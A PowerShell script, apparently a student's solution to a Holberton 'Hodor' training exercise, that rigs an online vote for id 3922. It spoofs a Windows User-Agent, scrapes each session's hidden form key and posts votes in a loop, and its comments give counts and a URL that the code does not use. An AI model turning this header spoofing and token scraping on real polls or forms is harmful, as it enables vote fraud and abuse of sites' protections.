#=======================================
#= 2. Level 2 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 4096 times for your id
# here: http://158.69.76.135/level1.php.
# Using WebRequest session (GET - POST)

#   hint: Only count windows users votes
#   for this, use User-Agent in headers.
#-----------------------------------------

$url = "http://158.69.76.135/level2.php";

$headers = @{
'User-Agent'='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
'referer'=$url;
'Content-Type'= 'application/x-www-form-urlencoded';
'ContentLength' = 512
}

function Get-Vote_Count{
    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method 'Get' -Headers $headers
    $parse = $page -split 'tr'
    $match_key = $parse -match '3922'
    $match_key = $match_key -split '<td>'
    $match_key = $match_key -replace '\n', ''
    $match_key = $match_key -replace '</td>', ''
    $match_key = $match_key -replace '>', ''
    $match_key = $match_key -replace  '</'
    $match_key = $match_key -split '\n'

    return $match_key[2]
}


$total = Get-Vote_Count
if ($null -eq $total) {
    $total = 0;
}

for($i = [int]$total; $i -lt 1024; $i++){
    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;

    $parse = $page -split ' '
    $match_key = $parse -match 'value'
    $match_key = $match_key -split '='

    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1].replace("`"","")}

    $IRM = Invoke-WebRequest -Uri $url -Method 'Post' -Headers $headers -Body $body -WebSession $hodor
    -join("sending vote ", ($i + 1), ": ")|Write-Host -NoNewline
    write-host $IRM.StatusDescription -ForegroundColor Green
}
$total = Get-Vote_Count
-join("Hodor Successful Cheat Voting, Total ", $total, ": ")|Write-Host
